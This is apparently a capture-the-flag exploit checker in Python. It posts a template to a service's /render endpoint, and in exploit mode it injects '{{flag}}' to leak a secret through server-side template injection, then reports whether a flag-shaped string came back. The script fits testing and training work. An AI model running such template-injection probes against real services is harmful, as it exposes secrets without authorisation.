import argparse
import json
import re
import urllib.error
import urllib.parse
import urllib.request

FLAG = re.compile(r"[A-Z0-9]{35}=")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--template", default="{{title}}")
    parser.add_argument("--exploit", action="store_true")
    args = parser.parse_args()
    template = "{{flag}}" if args.exploit else args.template
    request = urllib.request.Request(f"http://{args.host}:{args.port}/render", data=urllib.parse.urlencode({"template": template}).encode(), method="POST")
    try:
        response = urllib.request.urlopen(request, timeout=3)
        status, body = response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        status, body = error.code, error.read().decode("utf-8", "replace")
    except Exception as error:
        print(json.dumps({"ok": False, "status": 0, "flag_found": False, "flag_format_valid": False, "connection_error": type(error).__name__}))
        return
    found = bool(FLAG.search(body))
    print(json.dumps({"ok": 200 <= status < 300, "status": status, "flag_found": found, "flag_format_valid": found}))


if __name__ == "__main__":
    main()
